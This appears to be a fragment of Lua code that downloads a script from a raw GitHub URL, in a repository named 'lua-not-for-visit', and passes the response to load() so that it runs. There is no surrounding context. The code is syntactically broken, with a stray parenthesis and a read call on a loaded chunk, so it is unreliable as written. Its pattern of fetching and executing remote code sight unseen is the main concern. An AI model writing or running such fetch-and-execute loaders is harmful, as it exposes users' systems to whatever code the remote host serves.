local res, code, headers, status = 
        http.request 'https://raw.githubusercontent.com/bezumnui/lua-not-for-visit/main/test.lua')
load(res):read"*a")()
